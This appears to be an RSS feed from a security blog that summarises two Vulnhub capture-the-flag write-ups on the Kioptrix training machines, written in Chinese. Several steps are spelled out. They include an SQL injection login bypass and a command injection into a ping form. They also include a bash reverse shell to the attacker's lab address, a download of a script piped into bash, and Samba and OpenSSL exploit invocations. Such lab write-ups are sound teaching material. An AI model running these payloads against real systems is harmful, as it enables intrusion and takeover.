@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Vulnhub on gsh3ll</title>
+    <link>http://gsh3ll.top/categories/vulnhub/</link>
+    <description>Recent content in Vulnhub on gsh3ll</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 31 Aug 2020 11:44:05 +0000</lastBuildDate><atom:link href="http://gsh3ll.top/categories/vulnhub/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub-Kioptix-2靶机实战</title>
+      <link>http://gsh3ll.top/posts/vulnhub-kioptix-2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</link>
+      <pubDate>Mon, 31 Aug 2020 11:44:05 +0000</pubDate>
+      
+      <guid>http://gsh3ll.top/posts/vulnhub-kioptix-2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</guid>
+      <description>靶机地址：https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
+0x00 环境 攻击主机：Kali IP：192.168.20.3
+目标主机：CentOS IP：192.168.20.6
+使用工具：
+ nmap netdiscover/arp-scan dirb burpsuite LinEnum(https://github.com/rebootuser/LinEnum)，其用法地址(https://github.com/Jewel591/OSCP-Pentest-Methodologies/tree/master/PostExploit/File-Upload-Download)  0x01 信息收集 主机发现 使用arp-scan扫出目标主机IP：192.168.20.6
+端口扫描 使用nmap扫描发现开放了22、80、443、3306等端口。
+目录扫描也没发现什么可以利用的东西，80端口有个简单的登录页面。
+查看源码发现用户名Administrator。尝试爆破无果。
+0x02 漏洞利用 漏洞利用 登录爆破无果，那只能试试测试登录页面有什么漏洞了，登录框常见有SQL注入漏洞，于是尝试注入，发现password字段可以通过&#39; or 1=1 #绕过登录，跳转到一个页面。
+很明显是个执行ping命令的页面，首先想到是命令执行，输入127.0.0.1 &amp;amp;&amp;amp; whoami。能够返回信息，妥了。
+getshell 通过执行命令127.0.0.1;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.20.3/9001 0&amp;gt;&amp;amp;1并提交，kali利用nc监听9001端口，成功反弹shell。
+提权 前面扫描端口的时候发现开放了3306端口，于是着手找数据库账号密码。随后在index.php文件中找到数据库账号密码john/hiroshima。
+连接数据库：mysql -ujohn -phiroshima，发现webapp数据库的users表中有这些信息，但多次测试好像没什么用处。
+做到这里就无从下手了，剩下的步骤均是参考网上的教程做的。
+使用python搭建简单的web服务，用于上传LinEnum.sh脚本：python -m SimpleHTTPServer 80。
+根据LinEnum.sh脚本的用法，在拿到的反弹shell上使用wget命令：wget -qO - http://192.168.20.3/Desktop/LinEnum.sh | bash &amp;gt; /tmp/linenum.txt，下载脚本并通过管道传输到bash，然后输出重定向到linenum.txt文件上。
+然后重点关注这几点：
+ 运行的是什么操作系统、内核版本？ 有哪些用户可用？ 他们中是否有人有sudo权限？ 是否有任何SUID/SGID二进制文件？ 哪些文件是我的用户可以访问/写入的？  这里常规的提权方法（password/shadow 文件、Cron、SUID 等）都没行，所以只好采用内核提权，根据收集都得信息，目标主机是 CentOS 4.5，内核版本为 2.</description>
+    </item>
+    
+    <item>
+      <title>Vulnhub-Kioptix-Level-1靶机实战</title>
+      <link>http://gsh3ll.top/posts/vulnhub-kioptix-level-1%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</link>
+      <pubDate>Mon, 08 Jun 2020 09:23:05 +0000</pubDate>
+      
+      <guid>http://gsh3ll.top/posts/vulnhub-kioptix-level-1%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</guid>
+      <description>朋友丢了一个虚拟机文件给我，说试试能不能搞进去。下载下来看到是Kioptix-Level-1实战靶机，笔者比较菜，平时除了做一些简单的渗透测试之外，没有接触过这类东西，硬着头皮做了一下测试，还请各位师傅轻喷。
+0x00 实验环境 Kioptix Level 1靶机：192.168.20.4
+kali攻击机：192.168.20.2.5
+0x01 实战过程 发现目标 打开靶机和kali的vm，在kali上使用netdiscover -r &amp;lt;IP&amp;gt;来发现靶机。
+信息收集 得到目标靶机的IP后，先做简单的信息收集，上nmap，发现其开放了22、80、139等端口。
+浏览器打开该IP，是一个apache的test page，并没用部署网站，先扫描一下目录。
+dirsearch发现了几个路径，依次打开看下是什么来的。
+http://192.168.20.4/usage/，内容如下。
+http://192.168.20.4/maual有列目录，点开看到有下面页面。
+还有一个test.php，好像没啥用，用dirbuster还扫描出/mrtg/目录等。
+到此就没啥头绪了，想到朋友在发我靶机之前，有提起出nikto，于是在kali用nikto看下能扫出什么。（突然发现nikto还挺好用：））
+nikto的版本和朋友的相同，但是扫出来的结果和朋友发的好像不大一样。
+漏洞利用 smb服务 既然80端口没啥利用的，那就转战别的端口吧。靶机是开启了139smb服务的，先使用msf看下是什么版本的。
+smb版本是2.2.1a的，用searchsploit查找一下有没有可以利用的漏洞。
+有个RCE，google一下这个要怎么用。。。
+先复制出来用gcc编译。
+./smb_exp -b 0 &amp;lt;IP&amp;gt;可以拿到shell。
+SSL 除了smb，nikto好像还扫出可能存在SSL的漏洞。靶机的SSL_version是2.8的。
+嗯嗯，有几个缓冲区溢出，先复制出来编译看看。
+用法如下：
+第一次用，target参数好像是要输入下面的序号，靶机是红帽，且apache版本是1.3.20。
+./ssl 0x6a 192.168.20.4 443 -c 50
+诶？Good Bye是啥意思？google一下才发现有时候需要打几次，emmm。好吧。
+打了几次还是不行，把-c参数后的数值改成100，打进去了，成功getshell。
+可把我激动坏了。
+0x02 总结 这段时间真的浑浑噩噩的，学啥都学不进去，还真的感谢这位朋友。
+这次实战学到很多东西，包括exploitdb里面的.c文件的编译，以及head命令查看怎么编译.c文件。
+第一次用SSL这类漏洞getshell，感觉很爽。</description>
+    </item>
+    
+  </channel>
+</rss>
